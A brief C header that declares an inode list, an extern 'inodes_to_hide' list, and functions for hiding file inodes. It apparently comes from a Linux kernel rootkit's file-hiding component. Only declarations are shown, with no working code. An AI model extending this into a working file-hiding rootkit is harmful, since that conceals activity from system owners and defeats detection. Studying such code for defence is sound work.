struct inode_list {
    unsigned long ino;
    struct list_head list;
};
extern struct list_head inodes_to_hide;

void hide_file_inode(unsigned long ino);
int should_hide_inode(unsigned long ino);